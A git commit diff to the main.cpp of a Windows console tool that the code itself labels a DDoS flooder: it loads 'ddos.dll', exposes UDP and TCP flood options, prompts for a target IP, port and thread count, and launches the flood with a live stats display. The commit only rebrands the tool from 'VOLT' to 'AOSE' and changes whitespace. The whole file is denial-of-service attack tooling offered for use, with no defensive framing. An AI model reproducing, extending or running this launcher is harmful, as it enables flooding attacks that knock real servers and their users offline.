cec167d17058d38b869f1db419be31cfbbe2bf6d
Nemesis <jakubmatusiewicz40@gmail.com>
2026-07-19 23:19:56 +0200

    Update main.cpp

--- source/main.cpp
+++ source/main.cpp
@@ -1,4 +1,4 @@
-// main.cpp - VOLT
+// main.cpp - RANDOM NAME
 #include <windows.h>
 #include <iostream>
 #include <string>
@@ -22,18 +22,17 @@ int currentThreads;
 void printLogo() {
     setCyan();
     std::cout << R"(
- __      __   ___  _      _____ 
- \ \    / /  / _ \| |    |_   _|
-  \ \  / /  | | | | |      | |  
-   \ \/ /   | | | | |      | |  
-    \  /    | |_| | |____ _| |_ 
-     \/      \___/|______|_____|
+    ___    ____  _____ ______ 
+   /   |  / __ \/ ___// ____/
+  / /| | / / / /\__ \/ __/   
+ / ___ |/ /_/ /___/ / /___   
+/_/  |_/_____//____/_____/   
 )" << std::endl;
     setWhite();
 }
 
 void stats() {
-    while (running) {
+    while(running) {
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
         system("cls"); printLogo();
         setYellow();
@@ -46,46 +45,46 @@ void stats() {
 }
 
 int main() {
-    SetConsoleTitleA("VOLT");
-
+    SetConsoleTitleA("AOSE");
+    
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
     std::string dir = exePath;
     dir = dir.substr(0, dir.find_last_of("\\/"));
     std::string dllPath = dir + "\\ddos.dll";
-
+    
     HINSTANCE rustDll = LoadLibraryA(dllPath.c_str());
-    if (!rustDll) {
+    if(!rustDll) {
         setRed(); std::cout << "\n  ddos.dll not found!\n"; setWhite();
         system("pause"); return 1;
     }
-
+    
     FloodFunc tcpFlood = (FloodFunc)GetProcAddress(rustDll, "tcp_flood");
     FloodFunc udpFlood = (FloodFunc)GetProcAddress(rustDll, "udp_flood");
-
-    while (true) {
+    
+    while(true) {
         running = false;
         system("cls"); printLogo();
         setYellow(); std::cout << "\n  [1] "; setWhite(); std::cout << "UDP Flood\n";
         setYellow(); std::cout << "  [2] "; setWhite(); std::cout << "TCP Flood\n";
         setYellow(); std::cout << "  [3] "; setWhite(); std::cout << "Exit\n";
-        std::cout << "\n  VOLT> ";
-
+        std::cout << "\n  > ";
+        
         int c; std::cin >> c; std::cin.ignore();
-        if (c == 3) break;
-
+        if(c==3) break;
+        
         std::string ip; int port, threads;
         std::cout << "  Target: "; std::getline(std::cin, ip);
         std::cout << "  Port: "; std::cin >> port;
         std::cout << "  Threads: "; std::cin >> threads; std::cin.ignore();
-
+        
         running = true; packets = 0;
         currentTarget = ip; currentPort = port; currentThreads = threads;
         std::thread s(stats); s.detach();
-
-        if (c == 1) udpFlood(ip.c_str(), port, threads);
-        else if (c == 2) tcpFlood(ip.c_str(), port, threads);
-
+        
+        if(c==1) udpFlood(ip.c_str(), port, threads);
+        else if(c==2) tcpFlood(ip.c_str(), port, threads);
+        
         std::cin.get();
         running = false;
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
